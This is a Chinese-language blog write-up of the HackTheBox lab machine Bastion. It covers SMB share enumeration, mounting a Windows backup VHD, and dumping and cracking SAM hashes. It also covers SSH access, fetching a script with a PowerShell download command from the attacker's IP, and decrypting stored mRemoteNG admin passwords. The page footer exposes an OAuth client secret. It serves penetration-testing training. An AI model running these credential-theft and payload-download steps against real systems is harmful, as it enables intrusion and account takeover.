@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="google-site-verification" content="GjYXsAVrVHmdPdK6OZsuxDfM_CMjMll3MMINgHy5joM" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>HTB Bastion Writeup | Ikonw&#39;s blog</title>
+  <meta name="description" content="Hackthebox  machine writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Bastion Writeup">
+<meta property="og:url" content="https://ik0nw.github.io/2020/01/10/HTB-bastion/index.html">
+<meta property="og:site_name" content="Ikonw&#39;s Blog">
+<meta property="og:description" content="Hackthebox  machine writeup">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/image-20200924210807049.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/image-20200924210826254.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/image-20200924210848265.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/image-20200924210918572.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/2020011001300488.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110013425912.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110013652862.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110014239133.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110015004404.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110015521278.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110020035505.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110020241609.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110020309865.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110020826900.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110021000221.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110021043792.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110021237568.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110021316395.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110021405254.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110021514274.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/HTB-bastion/20200110021619237.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/root.gif">
+<meta property="article:published_time" content="2020-01-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-24T13:37:57.147Z">
+<meta property="article:author" content="Ik0nw">
+<meta property="article:tag" content="hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ik0nw.github.io/images/HTB-bastion/image-20200924210807049.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://ik0nw.github.io/2020/01/10/HTB-bastion/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Ikonw&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.css">
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="main-center theme-black no-sidebar" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ik0nw" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.png" width="600" height="600">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Ikonw</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">HacktheBox Player | OSCP</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Singapore</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-todo">
+          <a href="/todo">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Todo</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ik0nw" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">HTB Profile</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <script src="https://www.hackthebox.eu/badge/122569"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HackTheBox-Hard/">HackTheBox-Hard</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HackTheBox-Medium/">HackTheBox-Medium</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox/">hackthebox</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox/fortress/">fortress</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox-challenge/misc/">misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox-challenge/mobile/">mobile</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/php-audit/">php-audit</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/" rel="tag">cve</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dig/" rel="tag">dig</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns-enumeration/" rel="tag">dns enumeration</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/enumeration/" rel="tag">enumeration</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensic/" rel="tag">forensic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fortress/" rel="tag">fortress</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gitalk/" rel="tag">gitalk</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackthebox/" rel="tag">hackthebox</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hard/" rel="tag">hard</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/medium/" rel="tag">medium</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql-exec-cmd/" rel="tag">mysql exec_cmd</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scripting/" rel="tag">scripting</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/php-audit/">php-audit</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/23/PHP::Preg_replace()-RCE/" class="title">PHP::Preg_replace() RCE</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-23T00:00:00.000Z" itemprop="datePublished">2020-09-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox/">hackthebox</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/hackthebox/fortress/">fortress</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/21/HTB-fortress-Jet/" class="title">HTB Jet Fortress writeup</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-20T16:00:00.000Z" itemprop="datePublished">2020-09-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox/">hackthebox</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/hackthebox/fortress/">fortress</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/19/HTB-fortress-akerva/" class="title">HTB Akerva Fortress writeup</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-19T00:22:26.000Z" itemprop="datePublished">2020-09-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/17/HTB-Compromised/" class="title">HTB Compromised Writeup</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-16T23:28:25.000Z" itemprop="datePublished">2020-09-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/hackthebox-challenge/mobile/">mobile</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/11/Challenge-Cat/" class="title">HTB::Challenge [Mobile] Cat</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-10T21:38:37.000Z" itemprop="datePublished">2020-09-11</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-HTB-bastion" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HTB Bastion Writeup
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/01/10/HTB-bastion/" class="article-date">
+	  <time datetime="2020-01-09T16:00:00.000Z" itemprop="datePublished">2020-01-10</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/hackthebox/">hackthebox</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/hackthebox/" rel="tag">hackthebox</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/01/10/HTB-bastion/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.2k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 4(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>攻击机：官方Kali linux 2019 64位<br>作者: <strong>Ikonw</strong></p>
+<p><img src="/images/HTB-bastion/image-20200924210807049.png" alt="image-20200924210807049"></p>
+<h2 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h2><p><img src="/images/HTB-bastion/image-20200924210826254.png" alt="image-20200924210826254"></p>
+<p>正常的nmap端口扫描 没有太多的资讯，只有SMB和SSH 开着。</p>
+<h2 id="二，SMB-Enumeration"><a href="#二，SMB-Enumeration" class="headerlink" title="二，SMB Enumeration"></a>二，SMB Enumeration</h2><p>首先，利用smbclient 连接到靶机<br>方式有很多种， smbmap之类的 但我比较喜欢用简单的smbclient.<br>smbmap等其他工具在真实环境里 会自动进行大量操作，很容易被日志捕捉下来。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-bastion/image-20200924210848265.png" alt="image-20200924210848265"></p>
+<p>发现四个目标，其中三个是比较正常。<br>有意思的是 <strong>Backups</strong></p>
+<p>我们利用smbclient 看看是否允许我们连接到 <strong>Backups</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></table></figure>
+
+<p>这里利用””来 逃脱 “” 所以需要4个，而backup 两个。</p>
+<p><img src="/images/HTB-bastion/image-20200924210918572.png" alt="image-20200924210918572"></p>
+<p><img src="/images/HTB-bastion/2020011001300488.png" alt="asd"></p>
+<p>成功进入，发现三个文件。利用 <strong>get</strong> 把 <strong>note.txt</strong> 下载到本地。<br>大概的意思就是 系统管理员建议不要把整个backup 文件夹下载到本地。<br>按照文件夹的名字来看，应该是windows镜像的备份。</p>
+<p><img src="/images/HTB-bastion/20200110013425912.png" alt="asdf"></p>
+<p>于是我尝试将整个backup都挂载到本地。<br>在本地创建文件夹 <strong>/mnt/backup</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></table></figure>
+
+<p>挂载到本地并且允许读写操作</p>
+<p><img src="/images/HTB-bastion/20200110013652862.png" alt="在这asd述"></p>
+<p>7z 有一个功能是可以让你直接读取 vhd文件的格式。我们直接来读取5gb的文件<br>(文件较大 大概2分钟左右， 文件较多就只展示一部分）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-bastion/20200110014239133.png" alt="在fdsaf"></p>
+<p>可以看到这是几乎整个windows的备份。<br>既然是windows备份 我们是不是可以从SAM File里面直接提取用户的帐号密码呢</p>
+<h2 id="三，用户帐号密码"><a href="#三，用户帐号密码" class="headerlink" title="三，用户帐号密码"></a>三，用户帐号密码</h2><p>7z 只是让我们看到了文件，而不能看到内容。<br>我稍微google 了一下，发现一个兄弟在medium上面有篇文章利用ghost-mount挂载虚拟硬盘。<br>linux的 ghostmount 能让我们进入虚拟硬盘的文件</p>
+<p>链接: <a target="_blank" rel="noopener" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">文章地址</a></p>
+<p>跟着大哥走<br>首先我们需要<strong>安装 libguestfs-tools</strong>这个库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></table></figure>
+
+<p>简单的安装后，我们创建一个新的文件夹 <strong>/mnt/vhd</strong></p>
+<p>把vhd挂载在 这个文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-bastion/20200110015004404.png" alt="在asdasd"></p>
+<p>可以看到已经可以进入到 vhd文件里进行操作。<br>我首先要做的就是能不能直接到user desktop里拿到 user.txt</p>
+<p>samdump2可以完成这个任务</p>
+<p><img src="/images/HTB-bastion/20200110015521278.png" alt="在这asdasd"></p>
+<p>关于哈希值的利用方法很多，既然SMB是开着的 完全可以用哈希值传递攻击 登录系统。<br>个人原因 我比较喜欢尝试破解密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p>注意这边 administrator和 Guest显得的是 <strong>disable</strong><br>正常来说格式是<br>&lt;用户名&gt;:&lt;用户ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;留言&gt;:&lt;主目录&gt;<br>Administrator和guest的 LM HASH和NT hash都是一模一样。<br>这边要注意 aad3 和 31d6 都是代表为空说明这里没有数值<br>题外话。</p>
+<p>我们把L4mpje 的哈希值丢到crackstation.net 进行破解<br>得到帐号密码<br>L4mpje：bureaulampje</p>
+<p><img src="/images/HTB-bastion/20200110020035505.png" alt="在这sadad"></p>
+<p>很可惜 我们没有 RDP， 但我们有SSH（狗头）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到 cmd shell<br><img src="/images/HTB-bastion/20200110020241609.png" alt="在这里插入图片描述"><br><img src="/images/HTB-bastion/20200110020309865.png" alt="在这里插入图片描述"><br>现在开始准备提权。<br>碰到windows 我个人习惯是上JAWL 的脚本来看系统的信息来帮助我提权。</p>
+<p>链接: <a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">Jawl github地址</a></p>
+<p>因为这是我的第一个文章 我就简单的说下 如何在windows里传输文件<br>其实方式有很多种，<br>有的情况这个可以 有的情况那个可以<br>我就简单说一下 我个人喜爱的一个方法。<br><strong>powershell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1&#x27;,&#x27;C:\Users\L4mpje\Desktop\jaws-enum.ps1&#x27;)</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></table></figure>
+
+<p>题外话结束</p>
+<p>执行jaws-enum.ps1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>大概的看了下 并没有什么有趣的信息，但有一个地方引起了关注<br><strong>mRemoteNG</strong><br><img src="/images/HTB-bastion/20200110020826900.png" alt="在这里插入图片描述"></p>
+<h2 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h2><p>碰到陌生的软件就要上Google询问，果然我们发现了这软件存在比较弱的密码保护管理。<br><img src="/images/HTB-bastion/20200110021000221.png" alt="在这里插sad"><br>在另外一篇文章里 我们发现了储存密码的目录 是位于Appdata里。</p>
+<p>链接:<a target="_blank" rel="noopener" href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">文章传送门</a></p>
+<p><img src="/images/HTB-bastion/20200110021043792.png" alt="asdf"><br>这里再说点题外话。<br>Appdata属于隐藏的文件夹类型 正常的dir 是无法看见文件夹</p>
+<p><img src="/images/HTB-bastion/20200110021237568.png" alt="sadfasdfaf"></p>
+<p>利用 <strong>dir/a</strong> 来显示全部的文件</p>
+<p><img src="/images/HTB-bastion/20200110021316395.png" alt="asdf"></p>
+<p>成功找到管理员的密码</p>
+<p><img src="/images/HTB-bastion/20200110021405254.png" alt="a"></p>
+<p>利用github上面的一个python 脚本 来算出密码</p>
+<p>链接:github传送门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;</span></span><br><span class="line"></span><br><span class="line">成功取得密码</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-bastion/20200110021514274.png" alt="在这里插入图片描述"></p>
+<p>紧接着 SSH登陆管理员 并拿到root.txt</p>
+<p><img src="/images/HTB-bastion/20200110021619237.png" alt="在这里插入图片描述"></p>
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+           
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/01/13/HTB-wall/" title="HTB Wall Writeup"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ik0nw" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <!-- <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"> -->
+  <script src="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+  <script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '153ef9d1b046724fd097',
+    clientSecret: '155e9d390cdfd27128f5e0961d4b09b4e4ffcf36',
+    repo: 'Ik0nw.github.io',
+    owner: 'Ik0nw',
+    admin: ['Ik0nw'],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+  })
+  gitalk.render('comments')
+  </script>
+
+      
+
+
+
+
+
+
+
+</body>
+</html>
